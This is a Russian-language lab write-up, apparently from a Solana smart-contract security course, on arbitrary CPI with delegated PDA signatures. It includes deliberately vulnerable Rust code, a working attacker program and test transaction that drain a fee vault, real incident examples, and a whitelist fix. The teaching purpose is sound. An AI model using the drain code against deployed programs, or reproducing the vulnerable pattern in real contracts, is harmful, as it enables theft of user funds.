# 05 — Произвольный CPI и делегирование подписи PDA

**Класс:** Arbitrary CPI — программа вызывает «settlement-программу»,
выбранную вызывающим, и передаёт ей свою привилегированную подпись PDA.
**Файлы:** `native-programs/vuln05_arbitrary_cpi/` (нативная уязвимая
программа), `native-programs/attacker/` (mode 2), `tests/05_arbitrary_cpi.test.ts`.
**Последствие:** полный дрейн fee-vault через делегированную подпись PDA.

## 1. Суть уязвимости

Нативная (без Anchor) программа-«дистрибьютор комиссий» получает на вход:

- `fee_pda` — PDA программы с правом распоряжаться fee-vault,
- `settlement_program` — «программу расчётов», которую вызывающий указывает сам,
- `fee_vault`, `treasury`, `token_program` и «extra» аккаунты.

Инструкция **слепо** делает CPI в `settlement_program`, передавая ему все
аккаунты и подпись `fee_pda` через `invoke_signed`. Никакой проверки,
что settlement-программа — ожидаемая (whitelist).

Как только управляющий поток и привилегия передаются произвольному коду,
атакующий приносит **свою** программу, которая использует подписанный `fee_pda`
чтобы перевести весь fee-vault себе.

## 2. Уязвимый код (нативный Rust)

```rust
fn process_instruction(program_id: &Pubkey, accounts: &[AccountInfo], data: &[u8]) -> ProgramResult {
    let ai = &mut accounts.iter();
    let fee_pda          = next_account_info(ai)?;
    let settlement_prog  = next_account_info(ai)?;   // БАГ: выбрана вызывающим
    let fee_vault        = next_account_info(ai)?;
    let treasury         = next_account_info(ai)?;
    let token_program    = next_account_info(ai)?;
    let extras           = ai.as_slice();            // БАГ: пересылаются всё подряд

    let mut metas = vec![
        AccountMeta::new_readonly(*fee_pda.key, true),   // подпись PDA
        AccountMeta::new(*fee_vault.key, false),
        AccountMeta::new(*treasury.key, false),
        AccountMeta::new_readonly(*token_program.key, false),
    ];
    for e in extras {                                    // БАГ: extra-аккаунты
        metas.push(AccountMeta::new(*e.key, false));     // идут в CPI как есть
    }

    let ix = Instruction::new_with_bytes(*settlement_prog.key, &data[1..], metas);
    // БАГ: произвольный вызов С подписью fee_pda
    invoke_signed(&ix, accounts, &[&[b"fee".as_ref(), &[fee_bump]]])
}
```

## 3. Как эксплуатируется

Тест `tests/05_arbitrary_cpi.test.ts` использует программу атакующего с
двумя режимами: mode 0 («честная» программа — no-op) и mode 2 (кража).

1. **Позитивный сценарий** (для контраста): settlement-программа = attacker
   mode 0 — ничего не происходит, vault untouched (500 токенов).
2. **Атака**: settlement-программа = attacker mode 2. Дистрибьютор вызывает её,
   передавая `fee_pda` как подписанта. Программа атакующего читает баланс
   fee-vault из данных аккаунта и делает SPL `Transfer` всего баланса себе —
   автором перевода выступает **подписанный PDA**:

```rust
// mode 2 программы атакующего
fn drain_delegated_vault(accounts: &[AccountInfo]) -> ProgramResult {
    // fee_pda пришёл КАК ПОДПИСАНТ (его подписал дистрибьютор через invoke_signed)
    let amount = u64::from_le_bytes(fee_vault.try_borrow_data()?[64..72].try_into().unwrap());
    let mut ix_data = vec![3u8];               // SPL Token::Transfer
    ix_data.extend_from_slice(&amount.to_le_bytes());
    let transfer_ix = Instruction::new_with_bytes(*token_program.key, &ix_data, vec![
        AccountMeta::new(*fee_vault.key, false),
        AccountMeta::new(*attacker_ata.key, false),          // extra-аккаунт атакующего
        AccountMeta::new_readonly(*fee_pda.key, true),       // «власть» — PDA
    ]);
    invoke(&transfer_ix, &[fee_vault.clone(), attacker_ata.clone(), fee_pda.clone()])
}
```

```ts
await sendSelfSigned([nativeIx(PROG_IDS.vuln05, 1, Buffer.from([2]), [
  { pubkey: feePda,        isSigner: false, isWritable: false },
  { pubkey: PROG_IDS.attacker, isSigner: false, isWritable: false }, // ЗЛОЙ settlement
  { pubkey: feeVault,      isSigner: false, isWritable: true },
  { pubkey: treasuryDummy, isSigner: false, isWritable: false },
  { pubkey: TOKEN_PROGRAM_ID, isSigner: false, isWritable: false },
  { pubkey: attackerAta,   isSigner: false, isWritable: true },   // extra: куда красть
])], attacker);
```

## 4. Результат атаки (проверяется тестом)

```ts
assert.equal((await tokenBalance(feeVault)).toString(), "0");      // vault пуст
assert.equal((await tokenBalance(attackerAta)).toString(), "500"); // всё у атакующего
```

## 5. Реальный кейс: Wormhole (февраль 2022, ~$325M)

**Wormhole** (мост Solana↔Ethereum) — крупнейшая кража в истории Solana.
Атакующий подделал проверку подписи: контракт верификатора сверял
«guardian-подписи» с **подменённым sysvar-аккаунтом**, который атакующий
создал сам, после чего мост выдал wrapped-ETH без реального депозита.

Урок тот же, что и в arbitrary CPI: **код и данные, влияющие на распоряжение
средствами, должны быть захардкожены или проверены на принадлежность
протоколу**, а не приниматься от вызывающего.

Другой известный пример класса — **Raydium** (декабрь 2021): компрометация
authority market-программы позволила произвольные CPI; **Crema Finance**
(2022) — подмена аккаунтов во внешних вызовах.

## 6. Исправление

```rust
// Фикс: settlement-программа захардкожена, extra-аккаунты — whitelist
const APPROVED_SETTLEMENT: Pubkey = solana_program::pubkey!("Se7t1e...");

fn process_instruction_fixed(...) -> ProgramResult {
    let settlement_prog = next_account_info(ai)?;
    if settlement_prog.key != &APPROVED_SETTLEMENT {
        return Err(ProgramError::IncorrectProgramId);  // только одобренная программа
    }
    // extra-аккаунты не пересылаются вовсе, либо только известные:
    let ix = Instruction::new_with_bytes(*settlement_prog.key, plan_data, metas);
    invoke_signed(&ix, &infos, &[&[b"fee".as_ref(), &[fee_bump]]])
}
```

Правила:

1. **Никогда** не делать CPI в программу, выбранную вызывающим, если она
   не проверена на ожидаемый program id (whitelist/hardcode).
2. Никогда не передавать подпись PDA во внешний, вызывающий-управляемый контекст.
3. Extra-аккаунты пересылать только по whitelist; проверять их назначение.
4. В Anchor-программах — тип `Program<'info, SettlementProgram>` с
   `declare_id` whitelisted-программы закрывает класс целиком.

## 7. Запуск

```bash
./scripts/run_tests.sh tests/05_arbitrary_cpi.test.ts
```
